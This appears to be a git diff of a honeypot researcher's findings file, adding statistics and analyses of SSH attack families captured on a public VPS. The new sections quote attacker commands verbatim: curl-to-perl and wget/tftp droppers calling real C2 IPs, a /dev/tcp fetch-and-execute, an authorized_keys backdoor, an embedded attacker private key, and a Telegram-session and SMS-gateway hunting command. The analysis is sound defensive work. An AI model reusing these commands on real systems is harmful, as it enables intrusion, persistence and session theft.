@@ -1,18 +1,67 @@
-# Findings - 1546h on a public VPS
+# Findings - 2144h on a public VPS
 
 Helsinki VPS, port 22, fresh IP, no prior reputation.
-Data: 2026-05-26 11:37 UTC to 2026-07-29 21:11 UTC.
+Data: 2026-05-26 11:32 UTC to 2026-08-23 19:31 UTC.
 
 ```
-  105980 auth attempts
-    2397 unique source IPs
-   41301 unique passwords tried
-  103192 sessions accepted
-10558841 commands captured
-      15 attack families identified
+  190862 auth attempts
+    3069 unique source IPs
+   48077 unique passwords tried
+  188073 sessions accepted
+14325037 commands captured
+      22 attack families identified
 ```
 
-*(Previous snapshot: 1484h, 97463 attempts, 2356 IPs, 94675 sessions, 9772217 commands -- 2026-07-27)*
+*(Previous snapshot: 1546h, 105980 attempts, 2397 IPs, 103192 sessions, 10558841 commands -- 2026-07-29)*
+
+## What changed Jul 29 -> Aug 23
+
+```
+                    Jul 29      Aug 23      delta
+auth attempts       105980      190862      +84882
+unique source IPs     2397        3069        +672
+sessions accepted   103192      188073      +84881
+commands captured 10558841    14325037    +3766196
+unique passwords     41301       48077       +6776
+```
+
+- **Biggest window yet: +84882 attempts in ~598h.** That is ~3400/day against ~1650/day
+  for the whole previous run. Two single-day spikes carry most of it: 2026-08-03 alone is
+  50905 attempts, and 2026-08-19 is 23835. Baseline days are still ~200-400.
+
+- **Seven new families.** Three appeared in August: F16 perl dropper (Aug 20), F17
+  authorized_keys injector (Aug 17, single 4h burst), F18 SSH key + scp transport (running
+  since June but only isolated now). Four more came out of sequence-grouping the whole
+  dataset rather than from new traffic -- they were always there, too low-volume to see
+  until every session was hashed and grouped: F19 MikroTik/Telegram/SMS hunter, F20 busybox
+  IoT probe, F21 dd + /dev/tcp binary push, and a combined recon-variants section. See
+  sections 16-22.
+
+- **Low volume is not low interest.** F19 is 6 sessions and F21 is a single session, but
+  they are the two most technically distinct things in the dataset -- Telegram session
+  theft plus SMS-gateway hunting, and a 1.9MB UPX binary pushed through the SSH channel
+  with `dd`. Ranking families by session count would have buried both. Worth remembering
+  before I put a "top families" chart in the blog post.
+
+- **F15 exploded.** The `echo -e "\x6F\x6B"` beacon went from 14954 sessions to **139336**
+  -- 95% of every session that ran a command. Still 8 IPs. One family now dominates the
+  session count the way F10 dominates the command count.
+
+- **The tail is thin.** Sequence-grouping all 147097 sessions that ran at least one command
+  gives 2738 distinct command sequences, but 2611 of those are one-offs and only 50
+  sequences have 6+ sessions. Almost all traffic is a handful of bots repeating themselves
+  exactly.
+
+- **Delivery is moving off `wget | sh`.** F16 pipes to perl, F18 pulls over scp with its own
+  private key, F17 skips payloads entirely and just installs an SSH key. Three independent
+  families in one window all avoiding the pattern every detection rule greps for.
+
+- **Numbers caveat.** The merged log for this window contained duplicated records (my merge
+  error -- logrotate `dateext` names a file for the day the rotation ran, not the day it
+  covers, so 07-29 got spliced twice, and the legacy `.1.gz` block got prepended when it was
+  already present). Everything above is deduplicated: 11302 auth and 284291 session records
+  dropped before counting. The Jul 29 column is from a merge verified clean, so the deltas
+  are comparable.
 
 ## What changed Jul 19 -> Jul 27
 
@@ -384,7 +433,7 @@ The machine is claimed.
 
 Named after Romania's anti-corruption agency -- the malware author is trolling.
 
-![Diicot session replay](https://github.com/user-attachments/assets/7fce6ce8-85ea-4983-b20b-8cf5eab0e524)
+![Diicot session replay](https://github.com/user-attachments/assets/edacfeef-b426-4030-91e7-77dce0e288a1)
 
 *Session dc727dd9b39f -- 10 commands, 36s. The last exec line is the full kill chain: wipes crontab, locks authorized_keys with chattr, kills competing miners, then deploys.*
 
@@ -407,7 +456,7 @@ Random 10-char dir names to avoid collisions.
 The honeypot speaks the SCP wire protocol (sends the ready byte, parses headers, acks),
 so the bot thought all 11 uploads worked. Nothing was actually received.
 
-![SCP dropper session replay](https://github.com/user-attachments/assets/a60ec157-bbe7-479d-85c4-9bc6e4b12c6b)
+![SCP dropper session replay](https://github.com/user-attachments/assets/aecd3729-b9b7-4652-a378-2e89c77c753e)
 
 *Session d22ff677d549 -- 22 commands. Each line is a different directory tried: mkdir then scp -t immediately after. Systematic bruteforce, random 10-char names, all returned exit 0.*
 
@@ -430,7 +479,7 @@ Passwords seen: `i5n#_o$_6qFK!$s` and `$MWtB6=$e6mK#=E`. Strong, machine-generat
 The logic: bots are scanning the same ranges simultaneously. Get in first, change the
 password, nobody else can use the machine.
 
-![Password changer session replay](https://github.com/user-attachments/assets/c0dd6abe-c4c2-4f60-aa40-7152b37d4d7a)
+![Password changer session replay](https://github.com/user-attachments/assets/b9b6c1dd-5c43-4277-9569-43f7c9bea317)
 
 *Session 29e4813a04ad -- 4 commands, 2s. `passwd` fails silently, falls back to `chpasswd` with a machine-generated strong password. The whole thing runs and exits before a human could type the first command.*
 
@@ -460,7 +509,7 @@ the entry vector changes what persistence it sets up.
 
 Ran via SSH exec channel (not interactive shell) -- the original scripts missed it entirely.
 
-![C2 dropper session replay](https://github.com/user-attachments/assets/ef6c4883-dbea-45ca-aed6-b68da18d49c2)
+![C2 dropper session replay](https://github.com/user-attachments/assets/f3d5c7ac-23b3-416e-99b1-3b3d30c87681)
 
 *Session a7a62f0046ee -- 1 command, 0s. The hex in the echo decodes to `auth_ok` -- it beacons the C2 that authentication succeeded before pulling and executing the payload.*
 
@@ -488,7 +537,7 @@ the other revives the miner.
 
 Process names: `astats`, `netai`, `kstats`. Look like monitoring tools in `ps aux`.
 
-![w.sh persistence session replay](https://github.com/user-attachments/assets/4e2c3a3c-9924-4baf-8707-1ff991107ec8)
+![w.sh persistence session replay](https://github.com/user-attachments/assets/bf690f31-1d52-4128-a76e-ed1577627ff3)
 
 *Session 95bd06bfef71 -- 11 commands, 9s. Cron entry and systemd service written in the same session. The last three lines drop the miner binary three times -- /dev/shm first, then /tmp as fallback.*
 
@@ -507,7 +556,7 @@ deciding if the machine is worth deploying a miner on.
 Ended without deploying anything. Machine failed some criterion or it's a pure probe
 that reports back to a queue.
 
-![VPS infrastructure scout session replay](https://github.com/user-attachments/assets/37168a2a-fcda-4b73-a9ec-94aef7c55030)
+![VPS infrastructure scout session replay](https://github.com/user-attachments/assets/1faf3375-df10-4e32-a862-4b16f35a7631)
 
 *Session e1877e76a176 -- 35 commands, no payload. Checks package managers, disk speed, network, shadow file. Ends without deploying anything -- the machine passed or failed some internal scoring and the result went back to a queue.*
 
@@ -538,7 +587,7 @@ what to send next, externally.
 We had to fix the fake shell to pass this check: add arithmetic expansion `$((expr))`,
 awk NR==N condition, df -P flag, uname -srm case.
 
-![SSHCHK session replay](https://github.com/user-attachments/assets/e96a9455-3cbe-47c6-9870-8913fb62f7f7)
+![SSHCHK session replay](https://github.com/user-attachments/assets/3b196728-b5e0-421a-886a-64d695017e4e)
 
 *Session f63b5f809061 -- 1 command, 0s. The token `5718926f9304` is unique to this session. The C2 strips everything between BEGIN and END and parses the output -- OS, kernel, proof-of-work result, and disk device -- without ever asking for them separately.*
 
@@ -555,7 +604,7 @@ uname -s -m
 Just that. Gets "Linux x86_64", disconnects. Either cataloguing the internet or
 a first-stage probe before a payload bot follows up.
 
-![Minimal OS scanner session replay](https://github.com/user-attachments/assets/93dc0bd0-4f69-4395-819e-9e56007539ab)
+![Minimal OS scanner session replay](https://github.com/user-attachments/assets/2dbdbac5-b83e-4568-a333-b67fd9cd11dd)
 
 *Session d52879b810e9 -- 1 command, 3s. Gets the answer it needs and disconnects immediately. Lightest possible post-auth probe in the dataset.*
 
@@ -615,7 +664,7 @@ Hit again on 2026-06-02 (session 0256bdb274ae, 45.12.1.49). Started 13:35 Rabat,
 `/s/amd64` path, same fallback to hex echo injection when downloads fail. Period 9
 total: 506,989 echo commands -- F10 has run enough times to dwarf everything else combined.
 
-![ELF echo injector session replay](https://github.com/user-attachments/assets/e0e2ebce-5f56-48a9-bc47-deba8402e58c)
+![ELF echo injector session replay](https://github.com/user-attachments/assets/ed4eb32e-6d1a-4cf4-b9df-5dc2f4aa6cf8)
 
 *Session eadedac033be -- 43,314 commands, 1h21min. Each block is one binary written as hex chunks via echo. wget/curl tried first, failed, then the bot rebuilt the entire payload from shell commands alone.*
 
@@ -663,7 +712,7 @@ uses a 6-method fallback chain: curl -> wget -> python3 urllib -> python2 urllib
 LWP -> raw TCP socket with bash /dev/tcp. More robust than anything else in the dataset.
 Whether this is the same operator or a different one using overlapping infra is unknown.
 
-![Meow dropper session replay](https://github.com/user-attachments/assets/4507138a-7d2e-4421-b960-ff7adf8893dc)
+![Meow dropper session replay](https://github.com/user-attachments/assets/5b7e6e81-b730-4e4d-a46d-22cda6b06815)
 
 *Session 72a973e0ba30 -- 1 command, 7s. The entire kill chain in a single exec: download, execute, create two backdoor users, change password, write credential to /tmp/mew. Done before you could read the first line.*
 
@@ -702,6 +751,11 @@ that check is.
 TODO: check if wowo.biz.id/wowiloveyou/runningaway.x86 is still live, analyse the binary,
 figure out the relationship between F7 recon and F12 deploy.
 
+![wowo dropper session replay](https://github.com/user-attachments/assets/b713385b-9600-4ca9-8665-757db0aff1dd)
+
+*Session d9ddf36a96d3 -- 172.210.53.195, 41 commands. Full 35-command infrastructure recon
+first, then the payload drop at the end. One IP doing both halves in a single session.*
+
 ---
 
 ### 13. gJw27HGL -- SSH worm (two-bot pattern)
@@ -733,6 +787,11 @@ in quarantine was my own test from dropper_sim.go.
 
 Analysis pending. I need to learn IRC C2 basics and how to trace a bash script's network
 behavior before I can say anything meaningful about this one.
+
+![gJw27HGL SSH worm session replay](https://github.com/user-attachments/assets/0465512f-a78a-4120-aa0e-8f60015d405a)
+
+*Session 736804a5e683 -- 176.61.50.14. One command, and the 4.7KB bash worm arrives over SCP.
+The first payload the quarantine actually caught.*
 
 ---
 
@@ -789,6 +848,11 @@ The real payload was never sent. Either the honeypot's fake `top` output (or a f
 execution response) failed some check, or the real deployment goes to a separate queue
 and hasn't happened yet.
 
+![architecture capability prober session replay](https://github.com/user-attachments/assets/e3b27249-6e38-499c-ba38-ed30eb746e01)
+
+*Session eab1131b36ad -- 185.129.62.63, 8 commands. `top -bn1` to snapshot processes, then two
+handcrafted ELF test binaries pushed over SCP and executed. The real payload never came.*
+
 ---
 
 ### 15. SSH liveness/capability probe
@@ -812,8 +876,372 @@ My read: testing whether the exec channel executes and echoes back. If the C2 se
 Decision is made externally -- nothing more follows. Could be a pre-stage gate for a
 follow-up we never saw, or pure cataloguing.
 
+![ok-beacon session replay](https://github.com/user-attachments/assets/ee57414c-57ed-4dc2-860c-8c2363682591)
+
+*Session b920d4c991a7 -- 37.27.241.28. One command, `echo -e "\x6F\x6B"`, connection closed.
+Multiply by 139336 sessions.*
+
 ---
 
+### 16. perl dropper -- curl | perl
+
+**478 sessions, 186 IPs, 2026-08-20 13:45 -> 2026-08-23 19:29 Rabat. Still live at the
+time of the pull.**
+
+```bash
+uname -a 2>/dev/null || echo 'Unknown'
+curl -sS 154.70.152.216/zed | perl >/dev/null 2>&1 &
+export HOME=/dev/null
+```
+
+Three commands. The interesting one is the middle.
+
+Every other dropper family here pipes into `sh`. This one pipes into `perl`. Same shape,
+different interpreter. Perl is installed by default on most distros and nobody watches it
+the way they watch `curl | sh`. If a detection rule greps for `| sh` or `| bash` it does
+not fire here.
+
+`>/dev/null 2>&1 &` backgrounds it and throws away all output, so the session closes clean
+and the payload keeps running detached.
+
+`export HOME=/dev/null` after the fetch. No shell history file, no `~/.bashrc`, nothing
+written to a home dir. Cheap anti-forensics and it also means anything the payload does
+later cannot drop config in `$HOME`.
+
+The C2 is a bare IP on port 80, no TLS, path `/zed`. I have not fetched it.
+
+186 IPs in three days makes this the fastest-spreading family in the whole dataset. It
+showed up 4 days before I pulled and it is the only family that is clearly still ramping.
+
+**Probable precursor.** Cluster `63bb63ee10` is 928 sessions from 116 IPs starting
+2026-08-17, and it is exactly the first command of this family and nothing else:
+
+```bash
+uname -a 2>/dev/null || echo 'Unknown'
+```
+
+62 of the 186 perl IPs also ran that recon-only session. That is a real overlap, so my
+read is recon on the 17th, payload from the 20th. But 67% of the perl IPs never ran a
+recon-only session, so I am not tagging them as the same family. Left it as untagged
+C18 in family_mapping.json until I have more.
+
+![perl dropper session replay](https://github.com/user-attachments/assets/10ec501f-3e16-4cb3-a179-a12b31c56d8e)
+
+*Session d321ecc509f7 -- 162.241.235.82, 3 commands, under a second. Fingerprint, fetch,
+detach. The whole family fits on three lines.*
+
+---
+
+### 17. authorized_keys injector
+
+**52 sessions, 37 IPs, one burst: 2026-08-17 15:16 -> 19:29 Rabat. Never seen before or
+since.**
+
+```bash
+uname -a
+mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYteFBiVVKhUucH8Jjuzlh9pNriiQJFagSbuI1FN5czogKvtyc/...' 
+```
+
+No malware. No download. No miner. It writes an RSA public key and leaves.
+
+This is the quietest family in the dataset and probably the most dangerous one. Every other
+bot drops a binary that a scanner can find, a cron line that shows up in `crontab -l`, a
+process with a stupid name like `kswpad`. This one adds a line to a file that is supposed
+to have lines in it. Nothing to detect at runtime because nothing is running.
+
+Then whoever holds that private key just logs in later. As root. Legitimately, as far as
+sshd is concerned.
+
+4 hours, 37 IPs, then gone. Reads like someone bought a list of cracked hosts and ran one
+pass to convert password access into key access before the passwords got rotated.
+
+Worth noting the key is reused across all 37 IPs -- same public key every time. So it is
+one operator, not 37.
+
+The key comment is `rsa-key-20250409`. That is the default format PuTTYgen writes, and the
+date in it is April 2025 -- the keypair is over a year older than this campaign. Same
+operator has been reusing it a while.
+
+Full line, appended not overwritten, so an existing `authorized_keys` keeps working and
+nobody notices anything broke:
+
+```bash
+mkdir -p /root/.ssh && echo 'ssh-rsa AAAA... rsa-key-20250409' >> /root/.ssh/authorized_keys \
+  && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys 2>/dev/null
+```
+
+It even fixes the permissions afterwards. sshd refuses keys in a world-readable `.ssh`, so
+this is a bot that has been burned by that before.
+
+![authorized_keys injector session replay](https://github.com/user-attachments/assets/cb9a6034-3db0-43f5-8a1e-70f549cdf014)
+
+*Session 9f2153fb0867 -- 139.59.131.24, 2 commands. `uname -a`, then the key goes in. No
+payload, nothing running, nothing to find.*
+
+---
+
+### 18. SSH key + scp transport (F5 descendant)
+
+**375 sessions across two C2s, 4 IPs total. 2026-06-10 -> 2026-08-23. Longest-running of
+the new ones.**
+
+Same `auth_ok` beacon as family 5:
+
+```bash
+uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm
+echo '-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+...
+-----END OPENSSH PRIVATE KEY-----' > key.ppk
+echo 'StrictHostKeyChecking no
+UserKnownHostsFile /dev/null' > sshcfg
+chmod 400 key.ppk
+scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh
+if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh; else (wget -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s ssh; fi
+rm -rf sshcfg key.ppk out_sh
+```
+
+`\x61\x75\x74\x68\x5F\x6F\x6B\x0A` decodes to `auth_ok\n`. Same beacon as family 5, so
+same operator or same kit.
+
+What changed is the transport. Family 5 was fileless `wget | sh`. This one ships its own
+ed25519 **private** key, writes an ssh config that disables host key checking, and pulls
+the payload over **scp**. `wget | sh` is only the fallback if scp fails.
+
+That is a real upgrade. scp traffic to port 22 outbound looks like an admin copying a file.
+`wget` to a bare IP over https with `--no-check-certificate` looks like malware. If you are
+egress-filtering on HTTP, this walks straight past.
+
+Handing out a private key to every compromised host is sloppy though -- I have the key, so
+does anyone else who got hit. It is scoped to user `dlr` on the C2 and the base64 comment
+field says `dlr@sftp`, so it is probably a locked-down sftp-only account that can read one
+file. Still, it is attacker key material sitting in my logs.
+
+Two C2s over time:
+- `14.46.136.77` -- 28 sessions, 2026-06-10 -> 06-13, 1 IP
+- `217.60.195.113` -- 347 sessions, 2026-06-13 -> 08-23, 3 IPs
+  (`130.12.180.51`, `77.90.185.20`, `45.148.10.68`)
+
+Switched C2 on 06-13 and the new one has been up for over two months. `130.12.180.51` is in
+my top-15 source IPs overall.
+
+The cleanup line at the end (`rm -rf sshcfg key.ppk out_sh`) means on a real box there would
+be nothing left on disk pointing at the C2. I only have it because the honeypot logs the
+command, not the filesystem.
+
+![SSH key + scp transport session replay](https://github.com/user-attachments/assets/cfd9b763-8b92-4d0d-a049-3bd24c9f3e38)
+
+*Session 109081a457cd -- 130.12.180.51, one single exec command carrying the whole chain:
+beacon, write private key, write ssh config, scp the payload, run it, delete the evidence.*
+
+---
+
+### 19. MikroTik / Telegram / SMS gateway hunter
+
+**6 sessions, 3 IPs, 2026-06-12 -> 2026-07-24. Client `SSH-2.0-libssh2_1.11.0` -- the only
+family in the dataset not built on the Go SSH library.**
+
+```bash
+/ip cloud print
+ifconfig
+uname -a
+cat /proc/cpuinfo
+ps | grep '[Mm]iner'
+ps -ef | grep '[Mm]iner'
+ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata \
+       /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log \
+       /etc/smsd.conf* /usr/bin/qmuxd /...
+locate D877F783D5D3EF8Cs
+echo Hi | cat -n
+```
+
+This one is not a dropper. It does not download anything. It is looking for specific data
+and specific hardware, and if it does not find them it leaves.
+
+`/ip cloud print` is RouterOS. That is a MikroTik command, not Linux. So the same bot is
+sprayed at routers and at Linux boxes and just tries both syntaxes.
+
+The interesting line is the `ls`. Three different things in one glob:
+
+- `TelegramDesktop/tdata` -- Telegram Desktop's local session store. `D877F783D5D3EF8C` on
+  the next line is the tdata key file. If you copy that directory you get the logged-in
+  Telegram session, no password and no OTP needed. That is session theft, not credential
+  theft.
+- `/dev/ttyGSM*`, `/dev/ttyUSB-mod*`, `/usr/bin/qmuxd` -- GSM modem device nodes.
+- `/var/spool/sms/*`, `/var/log/smsd.log`, `/etc/smsd.conf*` -- smstools, the Linux SMS
+  gateway daemon.
+
+So: Telegram sessions, and the ability to send and receive SMS. Put those together and it
+reads like OTP interception. A box with a GSM modem attached is a phone number you can
+borrow.
+
+`echo Hi | cat -n` at the end is a pipe test -- checking the shell actually pipes before
+trusting any of the output above. My fake shell handles pipes, so it passed.
+
+Only 6 sessions across 3 IPs (`64.226.126.224` x4, `5.187.97.40`, `80.249.151.39`) in six
+weeks. Lowest volume of anything I have named, and by far the most targeted. Everything
+else here is spray-and-mine. This one is hunting.
+
+![MikroTik / Telegram / SMS gateway hunter session replay](https://github.com/user-attachments/assets/eb3aeb5d-f9d7-425a-b14a-27e0809b999d)
+
+*Session 656f3e0321fa -- 64.226.126.224, 9 commands. RouterOS syntax, competitor-miner check,
+then the Telegram tdata and GSM modem glob. Nothing downloaded, nothing dropped.*
+
+---
+
+### 20. busybox IoT probe
+
+**19 sessions, 7 IPs, 2026-06-15 -> 2026-08-18.**
+
+```bash
+/bin/busybox TEST
+cat /proc
+./
+```
+
+Three commands, all of them broken on purpose.
+
+`/bin/busybox TEST` is the Mirai family calling card. busybox prints its applet list and an
+error for an unknown command, and the loader greps the output for a known marker. It is not
+running TEST, it is checking that busybox exists and behaves like busybox. On real IoT gear
+busybox *is* the shell, so this is the fastest way to tell an embedded target from a real
+Linux server.
+
+`cat /proc` on a directory errors out too. Also deliberate -- the error text differs between
+busybox and coreutils.
+
+`./` is not a command at all.
+
+All three are fingerprinting by *error message*, not by output. That is why my honeypot never
+got the payload: I answer these plausibly enough to look alive but not the way real busybox
+answers, so the loader decided this was not the kind of box it wanted and never sent stage two.
+
+Concentrated on one IP (`31.77.227.120`, 12 of 19 sessions), rest spread across six.
+
+Worth flagging as a gap on my side: this is a family I can see knocking but cannot capture,
+because capturing it means emulating busybox error strings exactly.
+
+![busybox IoT probe session replay](https://github.com/user-attachments/assets/45f65641-9fae-4633-99e6-f63b25fe8d70)
+
+*Session d84f425e5304 -- 31.77.227.120, 3 commands, all of them deliberately invalid. It reads
+the error text, decides this is not real busybox, and leaves without sending stage two.*
+
+---
+
+### 21. dd + /dev/tcp binary push
+
+**1 session, 1 IP (`5.31.40.72`), 2026-08-05 01:13 Rabat. Client `SSH-2.0-makiko`.
+Session 45c6032c8ea9.**
+
+Two fileless transports in one session, neither using curl or wget.
+
+First, bash as an HTTP client:
+
+```bash
+nohup bash -c "exec 6<>/dev/tcp/172.100.0.1/60145 && echo -n 'GET /linux' >&6 \
+  && cat 0<&6 > /tmp/yjRvsSGHBE && chmod +x /tmp/yjRvsSGHBE \
+  && /tmp/yjRvsSGHBE mFh8tce4l4m42Kp0WZmYW3u7zqaVlr/Yqnt..." &
+```
+
+`/dev/tcp/host/port` is not a real device. It is a bash builtin -- bash opens the socket
+itself. So there is no curl, no wget, no python, no binary to find on disk, and nothing in
+`ps` except bash. If you removed every download tool from the box this still works. The
+payload gets an argument that looks like a base64 key, so it is parameterized per victim.
+
+Then, the actual binary pushed straight down the SSH channel:
+
+```bash
+dd bs=1 count=1911588 > /tmp/CrdPfVuUEW
+<1911588 bytes of raw binary on stdin>
+```
+
+1.9 MB written byte by byte into a temp file. The bytes contain `UPX!`, so it is a
+UPX-packed ELF.
+
+This is the same idea as family 10 but a different primitive. F10 wrote its binary with
+43000 `echo -e` chunks; this writes it in one `dd` from stdin. Both are solving the same
+problem -- get a binary onto a box using only the shell channel -- and `dd` is by far the
+tidier answer. One command instead of 43000.
+
+Only one session, so I cannot say whether it is a campaign or somebody testing. But the
+technique is the most competent thing in the whole dataset.
+
+`172.100.0.1` is a routable address, not RFC1918 -- easy to misread as internal.
+
+![dd + /dev/tcp binary push session replay](https://github.com/user-attachments/assets/82bed475-3201-46ed-b7f1-13b16a2a107f)
+
+*Session 45c6032c8ea9 -- 5.31.40.72. The `/dev/tcp` fetch and the `dd bs=1 count=1911588` line,
+followed by 1.9MB of raw UPX-packed ELF arriving through the SSH channel.*
+
+---
+
+### 22. Recon variants
+
+Three low-volume patterns that are clearly their own thing but not worth a section each.
+
+**Self-provisioning inventory bot** -- 9 sessions, 4 IPs, 2026-07-15 -> 2026-08-07.
+
+```bash
+which curl || apt install curl -y >/dev/null 2>&1
+which lscpu || apt install lscpu -y >/dev/null 2>&1
+which free || apt install procps -y >/dev/null 2>&1
+which df || apt install coreutils -y >/dev/null 2>&1
+...
+curl -s ipinfo.io/json
+```
+
+Every other family assumes its tools exist and fails silently when they do not. This one
+**installs them**. Then a full hardware inventory -- CPU model, RAM, disk total and free,
+uptime, process count, logged-in users -- and finishes by geolocating the host through
+ipinfo.io.
+
+Nothing is dropped and nothing persists. It reads like inventory for resale: specs plus
+location is exactly what you list a box with. `87.236.208.53` ran 6 of the 9.
+
+**Capability matrix scanner** -- 7 sessions, 1 IP (`206.123.156.179`), all on 2026-07-08.
+
+33 commands, every one wrapped in `|| echo Unknown` so nothing ever errors. First half is
+hardware and network, second half is a straight `command -v` sweep:
+
+```bash
+command -v sudo / docker / python3 / python / go / gcc / nginx / apache2 / httpd
+command -v mysql / psql / redis-cli / mongod / node / npm / systemctl / crontab
+id -u | grep -q 0
+```
+
+Different question from family 7. F7 asks what distro this is by probing package managers.
+This asks what the box can *do* -- can it build, can it serve, does it run databases, is
+there a container runtime, am I root. Thin evidence though: one IP, one day, never came back.
+
+**handshakebins.sh dropper** -- 5 sessions, `45.135.194.26` -> C2 `213.232.114.14`,
+2026-08-23. Landed the same day I pulled.
+
+```bash
+cd /tmp || cd /run || cd /
+wget http://213.232.114.14/handshakebins.sh
+busybox wget http://213.232.114.14/handshakebins.sh
+curl -o handshakebins.sh http://213.232.114.14/handshakebins.sh
+chmod 777 handshakebins.sh; sh handshakebins.sh
+tftp 213.232.114.14 -c get handshaketftp1.sh; chmod 777 handshaketftp1.sh; sh handshaketftp1.sh
+tftp -r handshaketftp2.sh -g 213.232.114.14; chmod 777 handshaketftp2.sh; sh handshaketftp2.sh
+rm -rf handshakebins.sh handshaketftp1.sh handshaketftp2.sh; rm -rf *
+```
+
+Five fetch attempts for the same file: wget, busybox wget, curl, then **TFTP twice with two
+different syntaxes** because the two common tftp clients disagree on flags. Somebody has
+been burned by minimal images with no HTTP client.
+
+Then `rm -rf *` in whatever directory it landed in. Not cleanup -- cleanup is the line
+before it. That is destructive, in `/tmp` or `/run` or `/`.
+
+Too fresh to say more. Worth watching on the next pull.
+
+![recon variants session replay](https://github.com/user-attachments/assets/c8b9ebb0-457c-4ea8-b5f8-837667b1c27c)
+
+*Session 7ce0b4000005 -- 87.236.208.53, 17 commands. `apt install`s its own missing tooling,
+inventories the hardware, then geolocates the box through ipinfo.io.*
+
+---
 ## Effect of auth-threshold=1
 
 Deployed 2026-05-29 06:15 UTC. Accept any password on first attempt.
